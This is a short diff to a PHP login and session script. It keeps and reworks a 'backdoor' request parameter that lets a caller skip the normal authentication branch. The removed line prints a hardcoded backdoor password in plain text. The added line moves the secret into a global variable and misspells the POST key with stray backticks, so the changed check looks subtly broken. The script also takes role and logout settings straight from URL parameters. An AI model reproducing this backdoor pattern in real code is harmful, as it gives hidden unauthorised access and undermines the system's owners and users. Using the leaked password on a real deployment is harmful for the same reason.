@@ -2,6 +2,7 @@
 session_start();
 global $now, $expire, $user_id, $fullname, $loginname;
 global $username, $password, $role, $readonlyroles, $logoutafter, $enckey;
+global $backdoor_password;
 
 $readonlyroles = $_GET['readonlyroles'];
 $logoutafter = $_GET['logoutafter'];
@@ -29,7 +30,7 @@ if (isset($_SESSION['identification'])) {
 	</div>';
         echo "<meta http-equiv=\"Refresh\" content=\"2; url=" . "logout.php?" . "\">";
     }
-} else if ($_POST['backdoor'] != '3rdl!nEg3n0typ3mw' and $_GET['backdoor'] != '3rdl!nEg3n0typ3mw') {
+} else if ($_POST['`backdoor`'] != $backdoor_password and $_GET['backdoor'] != $backdoor_password) {
     echo '							
 	<div class="alert alert-success">
 		<button type="button" class="close" data-dismiss="alert">&times;</button>
